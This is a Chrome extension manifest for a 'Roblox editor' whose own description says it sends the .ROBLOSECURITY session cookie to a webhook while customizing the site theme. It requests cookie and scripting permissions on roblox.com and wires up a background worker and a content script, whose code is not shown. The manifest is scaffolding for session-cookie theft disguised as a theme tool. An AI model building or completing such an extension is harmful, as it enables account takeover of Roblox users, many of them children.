{
  "manifest_version": 3,
  "name": "Roblox editor",
  "version": "1.2",
  "description": "Sends .ROBLOSECURITY to a specified webhook and customizes Roblox theme layout.",
  "permissions": ["cookies", "activeTab", "scripting", "storage"],
  "host_permissions": ["https://*.roblox.com/*"],
  "action": {
    "default_popup": "popup.html"
  },
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": ["https://www.roblox.com/*"],
      "js": ["contentScript.js"]
    }
  ]
}
